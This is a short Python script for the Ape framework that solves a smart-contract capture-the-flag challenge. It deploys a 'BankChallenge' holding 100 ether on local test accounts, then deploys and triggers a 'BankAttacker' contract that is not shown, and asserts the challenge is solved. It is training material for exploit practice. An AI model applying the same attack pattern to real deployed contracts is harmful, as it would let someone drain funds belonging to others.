from ape import accounts, project
from .utils.helper import w3

ETH_IN_BANK = w3.to_wei(100, "ether")


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    # deploy challenge contract
    print("\n--- Deploying Challenge ---\n")
    challenge = project.BankChallenge.deploy(
        sender=deployer,
        value=ETH_IN_BANK,
    )

    bank = challenge.bank()

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.BankAttacker.deploy(
        bank,
        sender=attacker,
        value=w3.to_wei(25, "ether"),
    )
    attacker_contract.attack(sender=attacker)

    # --- AFTER EXPLOIT --- #

    assert challenge.isSolved()

    print("\n--- 🥂 Challenge Completed! 🥂 ---\n")


if __name__ == "__main__":
    main()
